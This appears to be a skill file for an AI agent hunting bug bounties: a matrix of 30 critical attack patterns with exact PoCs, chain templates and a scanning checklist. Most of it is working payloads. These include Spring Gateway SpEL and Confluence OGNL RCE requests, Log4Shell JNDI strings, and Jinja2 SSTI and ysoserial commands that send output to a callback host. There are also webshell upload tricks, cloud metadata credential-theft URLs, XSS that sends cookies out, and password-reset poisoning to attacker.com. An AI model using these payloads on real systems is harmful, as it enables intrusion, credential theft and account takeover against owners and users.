---
name: critical-attack-matrix
description: Reference matrix of 30 highest-paying bug patterns (CVSS 9.0+) with exact PoCs, detection one-liners, chain templates, and bounty examples. Load from hunt-critical when you need a quick payload lookup. Use to answer "what's the highest-impact test on this surface right now."
---

# Critical Attack Matrix — 30 Patterns, Exact PoCs

Lookup table. Each pattern: detection signal, one-line PoC probe, expected confirmation, chain potential. Sorted by historical median bounty (highest first).

---

## A. RCE class (CVSS 9.8–10.0)

### A1. Spring Boot Actuator → Gateway Routes RCE (CVE-2022-22947)
- **Signal:** `/actuator/gateway/routes` returns 200 or 401-with-list
- **PoC:**
  ```
  POST /actuator/gateway/routes/x
  {"id":"x","filters":[{"name":"AddResponseHeader","args":{"name":"R","value":"#{T(java.lang.Runtime).getRuntime().exec('id')}"}}],"uri":"http://example.com"}
  POST /actuator/gateway/refresh
  GET  /actuator/gateway/routes/x → Response header R contains id output
  ```
- **Confirm:** `R: uid=...` in response
- **Chain:** RCE → IMDS → AWS keys → S3 customer data
- **Bounty:** $5k–25k

### A2. Spring Boot Actuator /heapdump → cred dump
- **Signal:** `/actuator/heapdump` returns binary
- **PoC:** `curl -o h.bin https://t/actuator/heapdump && strings h.bin | grep -iE 'password|secret|aws_|jdbc:'`
- **Confirm:** Real creds in heap
- **Chain:** Creds → DB → mass PII OR admin login
- **Bounty:** $3k–15k

### A3. JNDI / Log4Shell (CVE-2021-44228) in any header
- **Signal:** Java backend, header echo, slow response on long User-Agent
- **PoC:** `User-Agent: ${jndi:ldap://<collab>/x}` on every endpoint
- **Confirm:** Interactsh DNS hit
- **Chain:** RCE → IMDS → cloud
- **Bounty:** $5k–30k

### A4. Confluence CVE-2023-22527 OGNL
- **Signal:** Confluence Data Center/Server 8.0.x–8.5.3
- **PoC:**
  ```
  POST /template/aui/text-inline.vm
  label=%5cu0027%2b%23request.get(%5cu0027.KEY_velocity.struts2.context%5cu0027).internalGet(%5cu0027ognl%5cu0027).findValue(%23parameters.poc[0],%7b%7d)%2b%5cu0027&poc=@java.lang.Runtime@getRuntime().exec(%22id%22).getInputStream()
  ```
- **Confirm:** id in response
- **Bounty:** $5k–40k (still mass-exploited 2025)

### A5. SSTI Jinja2 → RCE
- **Signal:** `{{7*7}}` → `49` in reflected param
- **PoC:** `{{ lipsum.__globals__['os'].popen('curl http://<collab>/$(id|base64)').read() }}`
- **Confirm:** Interactsh hit + base64 id
- **Bounty:** $3k–15k

### A6. File upload extension bypass → webshell
- **Signal:** Upload accepts arbitrary file, returned URL is direct path
- **PoC matrix (priority order):**
  1. `shell.php.jpg`
  2. `shell.phtml`
  3. `shell.pHp`
  4. `.htaccess` upload then `shell.jpg`
  5. MIME spoof `Content-Type: image/jpeg`
- **Confirm:** `GET /uploads/shell.phtml?c=id` returns `uid=...`
- **Bounty:** $2k–20k

### A7. Java deserialization (CC1 chain)
- **Signal:** Cookie/param base64 starts `rO0AB`
- **PoC:** `java -jar ysoserial-all.jar CommonsCollections1 'curl http://<collab>/$(id|base64)' | base64 -w0`
- **Confirm:** Interactsh DNS hit
- **Bounty:** $5k–25k

### A8. Jenkins /script unauthenticated
- **Signal:** Jenkins fingerprint, `/script` returns Groovy console
- **PoC:** `curl --data 'script=println("id".execute().text)' https://t/scriptText`
- **Confirm:** id output
- **Bounty:** $3k–15k

### A9. n8n CVE-2025-68613 expression injection
- **Signal:** n8n banner, 103k+ exposed instances
- **PoC:** workflow node with `={{ ...constructor.constructor('return process.mainModule.require("child_process").execSync("id")')() }}`
- **Bounty:** $1k–8k

### A10. WSUS CVE-2025-59287 SoapFormatter
- **Signal:** Port 8530/8531 + `/ClientWebService/Client.asmx`
- **PoC:** SOAP request with SoapFormatter payload (see `hunt-rce` §3 .NET)
- **Bounty:** Critical — CVSS 9.8

---

## B. Auth bypass / ATO class (CVSS 9.0–9.8)

### B1. Password reset Host-header injection
- **Signal:** Reset email contains link built from `Host:` header
- **PoC:**
  ```
  POST /api/reset-password   Host: attacker.com
  {"email":"victim@target.com"}
  → victim receives email pointing at attacker.com/reset?token=...
  ```
- **Confirm:** Token arrives at attacker
- **Chain:** Steal token → reset → ATO
- **Bounty:** $1k–10k

### B2. JWT alg=none
- **Signal:** JWT in auth, `eyJ` prefix
- **PoC:** Re-sign header `{"alg":"none","typ":"JWT"}`, no signature
- **Confirm:** Server accepts forged token as admin
- **Bounty:** $2k–10k

### B3. JWT HS↔RS key confusion
- **Signal:** Public RSA key exposed (jwks endpoint), JWT signed RS256
- **PoC:** Re-sign HS256 using RSA public key as HMAC secret
- **Bounty:** $3k–15k

### B4. OAuth `redirect_uri` permissive validation
- **Signal:** `redirect_uri=` accepts `attacker.com.target.com` or path traversal
- **PoC:** OAuth flow with attacker-controlled redirect_uri → auth code lands at attacker
- **Chain:** Auth code → ATO
- **Bounty:** $2k–15k

### B5. SAML XSW (XML Signature Wrapping)
- **Signal:** SAML SSO, `/Shibboleth.sso/SAML2/POST`
- **PoC:** SAML Raider Burp ext → XSW1-XSW8 transforms
- **Confirm:** Login as admin without admin's password
- **Bounty:** $5k–30k

### B6. MFA bypass via response manipulation
- **Signal:** Backend checks MFA via response code 200/403
- **PoC:** Submit wrong OTP, intercept response, change `403` → `200`
- **Confirm:** MFA bypassed
- **Bounty:** $1k–8k

### B7. Account takeover via email change without re-auth
- **Signal:** `PATCH /me {"email":"..."}` accepts without password confirm
- **PoC:** Change victim's email to attacker → reset password
- **Bounty:** $1k–5k (requires IDOR on the PATCH)

### B8. Auth bypass via `X-Original-URL` / `X-Rewrite-URL`
- **Signal:** Backend is Spring/Java behind a reverse proxy
- **PoC:** `GET /public HTTP/1.1` + `X-Original-URL: /admin`
- **Confirm:** Admin endpoint reached
- **Bounty:** $1k–8k

---

## C. SSRF → cloud RCE class (CVSS 9.1–9.8)

### C1. SSRF → AWS IMDSv1
- **Signal:** URL parameter fetches remote resource (webhook, import, avatar)
- **PoC:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- **Confirm:** Role returned → fetch creds → `aws sts get-caller-identity`
- **Chain:** Creds → S3 customer data / SSM RCE
- **Bounty:** $5k–30k

### C2. SSRF → GCP metadata
- **PoC:** `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` + header `Metadata-Flavor: Google`
- **Confirm:** Access token returned
- **Bounty:** $5k–25k

### C3. SSRF → Azure IMDS
- **PoC:** `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` + `Metadata: true`
- **Bounty:** $5k–25k

### C4. SSRF → Redis Gopher RCE
- **Signal:** SSRF + internal Redis reachable on 6379
- **PoC:** Gopher payload (see hunt-rce §5 Redis Gopher)
- **Chain:** Cron write OR SSH key write → shell
- **Bounty:** $5k–20k

### C5. PDF generator SSRF → file read
- **Signal:** PDF export feature, server-rendered (wkhtmltopdf/Puppeteer)
- **PoC:** `<iframe src="file:///etc/passwd">` in user-controlled HTML
- **Confirm:** /etc/passwd in generated PDF
- **Bounty:** $1k–8k

---

## D. Cross-tenant / IDOR-with-impact class (CVSS 8.5–9.6)

### D1. IDOR on invoice/payment endpoint
- **Signal:** `GET /api/invoices/<id>` accepts arbitrary id
- **PoC:** Increment id, GET 50 invoices belonging to other tenants
- **Confirm:** Other-tenant company names + amounts
- **Bounty:** $2k–15k

### D2. Mass assignment promoting to admin
- **Signal:** Profile update accepts JSON, hidden `role` / `is_admin` field
- **PoC:** `PATCH /me {"email":"x","role":"admin"}` → check role updated
- **Bounty:** $2k–10k

### D3. UUIDv1 timestamp enumeration
- **Signal:** Object IDs are UUIDv1
- **PoC:** Extract MAC + timestamp from one UUID, generate adjacent UUIDs
- **Confirm:** Fetched objects belong to other users created seconds apart
- **Bounty:** $2k–10k

### D4. GraphQL introspection + IDOR
- **Signal:** `/graphql` introspection enabled
- **PoC:** `__schema` query → list types → query other-tenant `Org(id:"...")`
- **Bounty:** $2k–10k

### D5. Hidden API version exposes ungated endpoints
- **Signal:** `/api/v1/...` works; `/api/v0/...` or `/api/internal/...` skips authz
- **PoC:** Replay authed requests against alternate version prefixes
- **Bounty:** $1k–8k

---

## E. Cloud / supply-chain class (CVSS 8.5–10.0)

### E1. Public S3 bucket with customer data
- **Signal:** JS bundle / DNS reveals `bucket.s3.amazonaws.com`
- **PoC:** `aws s3 ls s3://bucket/ --no-sign-request`
- **Confirm:** Customer files listed/downloaded
- **Bounty:** $2k–15k

### E2. Subdomain takeover at OAuth `redirect_uri`
- **Signal:** Dangling CNAME on a subdomain used in OAuth redirect allowlist
- **PoC:** Claim the PaaS endpoint, capture auth codes
- **Chain:** Subdomain → OAuth → ATO
- **Bounty:** $3k–20k

### E3. AWS keys in JS bundle
- **Signal:** `AKIA[A-Z0-9]{16}` regex hit in any `.js`
- **PoC:** `aws sts get-caller-identity` with extracted keys
- **Bounty:** $1k–10k (depends on scope of role)

### E4. Public Lambda function URL no auth
- **Signal:** `<id>.lambda-url.<region>.on.aws/` reachable
- **PoC:** Invoke with crafted payload → internal logic accessible
- **Bounty:** $1k–8k

### E5. Dependency confusion (internal pkg name publishable to npm/PyPI)
- **Signal:** package.json mentions `@org/internal-foo` not on registry
- **PoC:** Publish stub, wait for build → RCE in CI
- **Bounty:** $5k–50k (Critical when CI has prod creds)

---

## F. Money / business-logic class (CVSS 8.5–9.8)

### F1. Negative-amount payment
- **Signal:** Money transfer endpoint, no input validation
- **PoC:** `{"to":"victim","amount":-100}` → victim's balance decreases
- **Bounty:** $2k–15k

### F2. Race condition on coupon / withdrawal
- **Signal:** Coupon redeem or withdrawal endpoint
- **PoC:** Burp Turbo Intruder 50 parallel requests → coupon applied N times
- **Bounty:** $1k–10k

### F3. Payment confirmation tamper
- **Signal:** Webhook callback `{"status":"success"}` from PSP
- **PoC:** Forge callback with success status → order completes without payment
- **Bounty:** $2k–20k

### F4. Currency-rounding abuse
- **Signal:** Multi-currency conversion, fractional rounding visible
- **PoC:** 1000 micro-transactions exploiting half-up rounding
- **Bounty:** $1k–8k

---

## G. Stored XSS → ATO chain (CVSS 8.0–9.6)

### G1. Stored XSS in admin-viewed field
- **Signal:** User submits content (support ticket, profile, report name) viewed by staff
- **PoC:** `<script>fetch('//collab/?c='+document.cookie)</script>` in field
- **Confirm:** Cookie hits Interactsh (use test admin first)
- **Chain:** Staff cookie → admin panel access
- **Bounty:** $2k–20k

### G2. SVG XSS via avatar upload
- **Signal:** Avatar upload accepts SVG, served on same origin
- **PoC:** `<svg><script>fetch('//collab/?c='+document.cookie)</script></svg>`
- **Bounty:** $1k–10k

### G3. Markdown XSS in `<a>` href
- **Signal:** Markdown rendered without href sanitization
- **PoC:** `[click](javascript:fetch('//collab/?c='+document.cookie))`
- **Bounty:** $500–5k

---

## Chain templates (combine primitives into Critical)

```
Open redirect          + OAuth code flow          = ATO                  (CVSS 9.6)
SSRF                   + AWS IMDS reachable       = cloud takeover       (CVSS 9.8)
IDOR (read)            + password change no step-up = persistent ATO     (CVSS 9.8)
Subdomain takeover     + parent-domain cookie     = session theft        (CVSS 9.6)
Stored XSS             + admin context            = admin ATO            (CVSS 9.6)
File upload bypass     + direct URL exec          = unauth RCE           (CVSS 10.0)
XXE                    + OOB DTD                  = secret → forged JWT  (CVSS 9.0)
Path traversal         + .git/config readable     = source → secrets     (CVSS 9.1)
Host-header injection  + password reset email     = token to attacker    (CVSS 9.1)
Mass assignment        + hidden role field        = admin promotion      (CVSS 9.0)
Subdomain takeover     + OAuth redirect_uri       = auth code theft      (CVSS 9.6)
SSRF                   + internal Redis           = RCE via Gopher       (CVSS 9.8)
GraphQL introspection  + cross-tenant query       = mass PII             (CVSS 9.1)
Dependency confusion   + CI prod creds            = supply chain RCE     (CVSS 10.0)
JWT alg=none           + admin claim accepted     = admin impersonation  (CVSS 9.8)
```

---

## Quick reference — the "first 60 minutes" checklist

| Min | Action |
|-----|--------|
| 0–5 | `nuclei -tags kev,vkev -severity critical,high` against live.txt |
| 5–10 | Enumerate `/actuator`, `/script`, `/console`, `/manager`, `/admin`, `/n8n` |
| 10–15 | Try `${jndi:ldap://<collab>/x}` in User-Agent on every endpoint |
| 15–20 | Test SSTI polyglot `${{<%[%'"}}%\.` on every reflected param |
| 20–30 | Test SSRF on every URL-fetching field — point at `<collab>` |
| 30–40 | Upload bypass matrix on every `/upload` `/avatar` `/import` |
| 40–50 | JWT alg=none + kid traversal + weak HS256 secret |
| 50–60 | OAuth redirect_uri tampering + password reset host header |

By the end of 60 minutes you've covered ~80% of the surfaces that pay Critical.
